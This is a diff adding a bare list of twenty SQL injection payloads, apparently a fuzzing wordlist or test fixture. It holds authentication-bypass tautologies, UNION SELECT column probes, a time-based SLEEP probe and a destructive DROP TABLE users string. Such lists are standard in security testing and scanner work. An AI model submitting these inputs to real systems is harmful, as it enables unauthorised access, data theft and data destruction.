@@ -1,0 +1,20 @@
+' OR 1=1--
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+') OR ('1'='1
+') OR ('1'='1'--
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND SLEEP(2)--
+"; DROP TABLE users--
+1' AND 1=1--
+1' AND 1=2--
+1 OR 1=1
+1) OR 1=1--
